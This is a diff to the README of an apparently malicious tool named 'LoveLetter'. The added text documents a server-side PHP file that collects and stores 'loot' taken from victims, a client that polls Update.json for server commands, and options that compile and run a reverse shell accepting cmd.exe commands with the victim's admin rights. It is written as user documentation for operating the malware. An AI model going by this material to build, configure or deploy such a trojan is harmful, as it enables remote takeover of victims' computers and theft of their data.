@@ -1,5 +1,9 @@
+## [TellMe.php](TellMe.php)
+The PHP file that handles and stores loot from the letter and stores them nicely structured on the server.
+
+<br/>
 <div>
-  <img width="150" align="right" src="../Repo/Images/2.gif" alt="LoveLetter"/>
+  <img width="100" align="right" src="../Repo/Images/2.gif" alt="LoveLetter"/>
   <br>
   <h1>⚙️ Configuration</h1>
   <p>Update.json is being fetched by the client to check for any server commands. You can update it to your liking.</p>
@@ -81,6 +85,13 @@ Direct links to any text files that will be compiled as executables and ran. Ex.
       "item2": 0.1
     }
 ```
-TODO: Create a panel.
+> - Open Shell? ```OpenShell```
+
+If true, compiles a reverse shell and runs it.
+
+> - Shell Bind Interface ```ShellBind```
+
+The ip and port to bind the reverse shell with, it will listen on this interface for any incoming cmd.exe commands. If the letter runs with admin rights, the shell instance will have the same level of permissions as well.
 <br/>
-Goodluck 💖
+<br/>
+**Goodluck 💖**
